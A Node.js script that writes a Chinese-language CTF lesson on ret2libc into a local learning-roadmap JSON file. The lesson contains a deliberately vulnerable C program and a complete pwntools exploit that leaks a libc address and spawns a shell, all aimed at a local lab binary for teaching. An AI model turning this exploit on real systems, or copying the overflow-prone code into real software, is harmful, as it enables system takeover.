import fs from 'fs';

const file = 'C:/Users/LLZY2/.roadmap-skill/projects/proj_1792501168121_wfulv9v.json';
const d = JSON.parse(fs.readFileSync(file, 'utf-8'));
const t = d.tasks.find(x => x.id === 'pwn_2_3_ret2libc');

t.description = `# 🎯 节点 2.3：突破 ASLR 随机化：ret2libc 与 GOT 地址泄露反推基址

> **核心认知沉淀**：运行时代基址随机化、信息泄露计算 Base、符号解析劫持。两阶段 ROP 绝技：借 puts 打印 puts@got 破除 ASLR，跳回 main 实施二次致命打击。

---

## 一、 场景矛盾与第一性原理（为什么必须用 ret2libc？）

### 1. 现实世界的残酷困境
在刚才的节点 2.2 中，我们使用了 \`-static\` 静态编译，程序里打包了大量的现成汇编零件（Gadgets），甚至连系统调用 \`syscall\` 都有。
但在现实生活、真实软件和主流 CTF 竞赛中：
- 99% 的二进制程序都是**动态链接（Dynamic Linking）**的，体积只有十几 KB！
- 程序自身精简到极点，**根本找不到 \`syscall\` 指令，更找不到一整套能够控制 \`rax\`, \`rdi\`, \`rsi\`, \`rdx\` 的 Gadgets**！
- 面对开启了 NX 的动态链接程序，上哪去弄执行权限？

### 2. 庞然大物的馈赠：libc.so
虽然程序自身极其精简，但每个 Linux 程序在运行时，操作系统都会给它强制挂载一个功能强大的庞然大物 —— **标准 C 动态库（libc.so.6）**！
在 libc 库中，包含了成千上万个系统函数（包括可以秒出交互终端的 \`system()\`、\`execve()\`）以及成片的可读字符串（包括 \`"/bin/sh"\`）！

### 3. ASLR 的封锁与“大楼平移”第一性原理
- **ASLR 拦路虎**：Linux 内核开启 ASLR（地址空间布局随机化）后，每次程序启动，**整个 \`libc.so\` 在虚拟内存里的加载基地址（\`libc_base\`）都是随机变动的**！这次可能是 \`0x7fff7e400000\`，下一次运行可能就跳到了 \`0x7fff81200000\`。黑客根本无法硬编码一个死地址去跳 \`system\`。
- **物理破局铁律（相对位移恒定）**：
  把 \`libc.so\` 想象成一栋**整栋平移的高楼**。
  虽然整栋大楼每次都被操作系统空降在城市的不同未知位置，但是——**大楼内部的物理结构是完全焊死的**！
  - \`puts()\` 办公室离大楼一楼大门（\`libc_base\`）有多远？
  - \`system()\` 办公室离大门有多远？
  - \`"/bin/sh"\` 仓库离大门有多远？
  **这些差值（在二进制里称为符号偏移 Offset）在 libc 编译生成的那一秒起就绝对恒定、永久不变！**

### 4. 决胜公式（Pwn 选手的毕生信仰）：
\`\`\`text
1. 运行时 libc 基地址 = 动态泄露出的某函数真实地址 - 该函数在 libc 中的固定静态偏移
   libc_base = puts_real_addr - libc.symbols['puts']

2. 任意目标函数真实地址 = 运行时 libc 基地址 + 目标函数在 libc 中的固定静态偏移
   system_real_addr = libc_base + libc.symbols['system']
   binsh_real_addr  = libc_base + next(libc.search(b'/bin/sh'))
\`\`\`

---

## 二、 经典靶场 C 源码与编译参数

为了让你彻底看清动态链接与 ASLR 交互的真实全貌，我们设计以下标准靶场：

\`\`\`c
// 靶场源码：ret2libc_demo.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[32]; // 32 字节局部缓冲区
    puts("Hello hacker, can you ret2libc?");
    read(0, buf, 0x100); // 致命漏洞：允许读入 256 字节，严重冲垮栈帧！
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
\`\`\`

### 编译命令与防护状态：
\`\`\`bash
gcc -fno-stack-protector -no-pie -m64 -o ret2libc_demo ret2libc_demo.c
\`\`\`
- 开启 **NX**（默认开启，数据不可执行）。
- 开启 **ASLR**（Linux 内核默认开启，libc 基地址每次随机）。
- 关闭 **Canary**（\`-fno-stack-protector\`，专注攻坚 ret2libc）。
- 关闭 **PIE**（\`-no-pie\`，保证程序自身的 \`.plt\` 表、\`.got\` 表和 \`main\` 函数地址固定不变）。

---

## 三、 两阶段 ROP 战法深度拆解（借鸡生蛋，绝地反击）

既然要算基地址，就必须先**拿到一个真实地址**；拿到之后，还得**再输入一次 Payload**去打 \`system\`。因此，ret2libc 在物理上必须由两段完美的 ROP 链闭环组成：

### 阶段一：借 \`puts\` 之手，打印 \`puts@got\`，并优雅重返 \`main\`
我们在第一轮栈溢出时，构造如下 ROP 链：
1. \`pop_rdi_ret\`：准备好参数传递跳板；
2. \`puts_got\` 地址：作为第 1 参数灌入 \`RDI\`；
3. \`puts_plt\` 地址：调用 \`puts(puts@got)\`！由于 \`puts@got\` 里记录着当前运行时刻 \`puts\` 函数在内存中的绝对真身，\`puts\` 会毫无防备地将这 8 个字节的物理真身直接打印到终端！
4. **神来之笔：\`main\` 函数入口地址**：把它垫在返回地址后面！\`puts\` 打印完毕返回时，CPU 会顺理成章跳回 \`main\` 重新开始，**程序不会崩溃自杀，而是老老实实等待我们的第二次输入！**

### 阶段二：计算 libc 基址，组装 \`system("/bin/sh")\` 终结比赛
1. 攻客脚本（Python）在终端捕获刚才喷出的 8 字节真实地址；
2. 利用公式算出本次运行的 \`libc_base\`、\`system\` 真实地址与 \`"/bin/sh"\` 真实地址；
3. 程序此时正好在 \`main\` 中再次执行 \`read()\` 等待输入；
4. 我们立刻打入第二段 ROP 链：
   \`pop_rdi_ret\` $\to$ \`binsh_real_addr\` $\to$ \`ret_gadget (对齐)\` $\to$ \`system_real_addr\`！
   Root Shell 瞬间弹出！

---

## 四、 物理内存空间装配对比表

| 栈偏移位置 | 阶段一 Payload (信息泄露与复活) | 阶段二 Payload (提权终结) |
| :--- | :--- | :--- |
| **\`0 ~ 31 字节\`** | 32 字节垃圾填充 (\`b"A" * 32\`) | 32 字节垃圾填充 (\`b"A" * 32\`) |
| **\`32 ~ 39 字节\`** | 8 字节覆盖 Saved RBP (\`b"B" * 8\`) | 8 字节覆盖 Saved RBP (\`b"B" * 8\`) |
| **\`Saved RET\`** | **\`pop_rdi_ret\`** | **\`pop_rdi_ret\`** |
| **\`+0x08\`** | **\`puts@got\`** (参数：取通讯录内容) | **\`binsh_real_addr\`** (参数：指向 "/bin/sh") |
| **\`+0x10\`** | **\`puts@plt\`** (执行打印) | **\`ret_gadget\`** (消耗 8 字节，解决 movaps 16 字节对齐) |
| **\`+0x18\`** | **\`main_addr\`** (复活回到入口，等待二段打击) | **\`system_real_addr\`** (执行 Shell 启动) |

---

## 五、 C 语言运行时与 Python Pwntools 交互时序图

\`\`\`text
[ 目标程序 (ret2libc_demo) ]                        [ 攻客脚本 (exp_ret2libc.py) ]
          |                                                     |
  puts("Hello hacker...") ----------------------------> 接收提示语
  read(0, buf, 0x100) <--- 发送 Stage 1 ROP 链 -------- 发送第一轮 Payload
  vuln() 执行 ret                                                |
          | (触发 Stage 1 ROP)                                  |
          v                                                     |
  puts(puts@got) -------- 喷出 8 字节 puts 真实地址 -------> 接收地址并反推 libc 基址！
  ret 跳回 main ----------------------------------------+       |
          |                                             |       v
  重新进入 main() -> vuln()                              | 算好 system 与 "/bin/sh"
  puts("Hello hacker...") ----------------------------> 再次接收提示语
  read(0, buf, 0x100) <--- 发送 Stage 2 ROP 链 -------- 发送第二轮 Payload
  vuln() 执行 ret                                                |
          | (触发 Stage 2 ROP)                                  |
          v                                                     |
  system("/bin/sh")                                             |
          |                                                     |
  [ 产生交互式控制台 ] <========================================> p.interactive()
\`\`\`

---

## 六、 工业级 Exploit 完整落地脚本

\`\`\`python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 工业级利用脚本：exp_ret2libc.py
from pwn import *

# 1. 基础配置
context(arch='amd64', os='linux', log_level='debug')

# 2. 目标程序与本地动态库加载
p = process('./ret2libc_demo')
elf = ELF('./ret2libc_demo')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # 本地加载 libc 符号文件

# 3. 提取自身固定符号与 Gadget (由于 -no-pie，自身地址固定)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

# 寻找程序内部自带的 pop rdi; ret 与用于对齐的纯 ret
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

offset = 32 + 8 # 40 字节偏移

# ==========================================
# 阶段 1：发送泄露链，打印 puts@got 并返回 main
# ==========================================
p.recvuntil(b"Hello hacker, can you ret2libc?\n")

payload1 = flat([
    b"A" * offset,
    pop_rdi,
    puts_got,
    puts_plt,
    main_addr # 核心：执行完毕无缝回到 main
])

p.sendline(payload1)

# 接收泄露出的 puts 真实物理地址 (64位地址末尾截断提取)
puts_leak = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
log.success(f"Leaked puts real physical address : {hex(puts_leak)}")

# ==========================================
# 计算 libc 真实基址与目标指针
# ==========================================
libc_base = puts_leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

log.info(f"Calculated libc_base Address      : {hex(libc_base)}")
log.info(f"Calculated system real Address    : {hex(system_addr)}")
log.info(f"Calculated '/bin/sh' real Address : {hex(binsh_addr)}")

# ==========================================
# 阶段 2：程序已回到 main，发送提权 ROP 链
# ==========================================
p.recvuntil(b"Hello hacker, can you ret2libc?\n")

payload2 = flat([
    b"A" * offset,
    ret_gadget, # 严谨垫高 8 字节，解决 movaps 16 字节对齐崩溃！
    pop_rdi,
    binsh_addr,
    system_addr
])

p.sendline(payload2)
log.success("Sent Stage 2 Payload! Popping Shell...")

# ==========================================
# 阶段 3：获取交互式 Root Shell
# ==========================================
p.interactive()
\`\`\`

---

## 📌 知识树全景画布与进度看板

| 编号 | 模块 / 节点 | 核心机制 / 权衡问题 | 状态 | 认知沉淀 / 补丁备注 |
| :--- | :--- | :--- | :---: | :--- |
| **0.1** | 虚拟内存分段模型 | 虚拟地址拓扑、代码/数据/堆/栈段权限 (R/W/X) | \`[v]\` | 物理隔离：代码段 r-x 禁止修改，栈段 rw- 执行受限 (NX 根源) |
| **0.2** | CPU 寄存器与微操作 | RIP 只读本质、RSP/RBP 栈锚定、push/pop/call/ret 微指令 | \`[v]\` | 微操作透视：call 自动压栈 RET，ret 等价于盲目 pop rip |
| **0.3** | 动态链接与 PLT/GOT | 延迟绑定物理流转、GOT 表运行改写与符号泄露 | \`[v]\` | 核心心智：PLT 是查号办事窗口，GOT 是通讯录；读破 ASLR，写换函数 |
| **1.0** | 栈帧劫持 (ret2text) | 栈向下生长 vs 数组向上溢出对冲、MOVAPS 16 字节对齐 | \`[v]\` | 物理本质：call 与 ret 导致的 8 字节错位，垫一个 ret 破除崩溃 |
| **1.1** | 栈迁移 (Stack Pivoting) | 空间受限下伪造 fake stack 与双重 leave; ret 联动 | \`[v]\` | 实战定式：改 RBP 为新家地址，劫持 RET 至 leave; ret，头部留 8 字节给 pop rbp 吃 |
| **2.1** | Canary 防御与绕过 | 栈金丝雀插入机制、\\x00 截断保护、格式化/未截断泄露 | \`[v]\` | 实战定式：覆写末位 \\x00 借 puts/printf 喷出，拼回 \\x00 原样填入绕过 |
| **2.2** | NX 与 ROP 链构造 | 不可执行下拼接零件 (Gadgets)、ret2syscall 传参 | \`[v]\` | 物理拆解：系统调用链手工装配 (RAX=59, RDI=&binsh, RSI=0, RDX=0) |
| **2.3** | **ASLR 与 ret2libc** | **基址随机化、信息泄露反推 Base、GOT 劫持** | **\`[>]\`** | **当前攻坚：借 puts 打印 puts@got 破除 ASLR，跳回 main 实施二次打击** |
| **2.4** | RELRO 约束 | Partial vs Full RELRO 机制对 GOT 覆写可行性的硬性封锁 | \`[ ]\` | 待推进 |
| **2.5** | ret2csu 通用 Gadget | 缺乏指定寄存器零件时的 __libc_csu_init 万能传参 | \`[ ]\` | 待推进 |

- **当前锚点**：节点 2.3（突破 ASLR 随机化：ret2libc 与 GOT 地址泄露反推基址）
- **下一推进方向**：彻底搞懂 ret2libc 后，切入保护对抗的深水区 —— **2.4 RELRO 约束（为什么有时候 GOT 表只能读不能写？）**。

---

## 🎯 实验验证清单与思考题

1. **在 Stage 1 泄露地址时，为什么我们必须在 Payload 末尾填入 \`main\` 函数地址，如果填一个垃圾值会发生什么物理现象？**
2. **在 64 位 Linux 中，为什么通过 \`puts\` 打印出来的 libc 地址通常只有 6 个有效字节（末尾以 \`\\x7f\` 结尾），在 Python 里我们为什么需要用 \`.ljust(8, b"\\x00")\` 补齐到 8 字节才能被 \`u64()\` 正确解包？**
`;

fs.writeFileSync(file, JSON.stringify(d, null, 2), 'utf-8');
console.log('Successfully updated 2.3 courseware to masterclass quality!');
